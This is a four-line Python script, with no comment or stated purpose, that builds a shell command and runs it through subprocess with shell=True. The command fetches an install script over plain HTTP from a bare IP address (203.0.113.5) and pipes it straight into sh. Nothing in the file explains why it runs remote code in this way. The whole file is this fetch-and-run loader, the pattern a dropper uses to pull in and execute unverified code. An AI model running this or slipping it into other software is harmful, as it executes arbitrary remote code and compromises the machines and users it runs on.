import subprocess

c = "curl -fsSL http://203.0.113.5/install.sh | sh"
subprocess.run(c, shell=True)
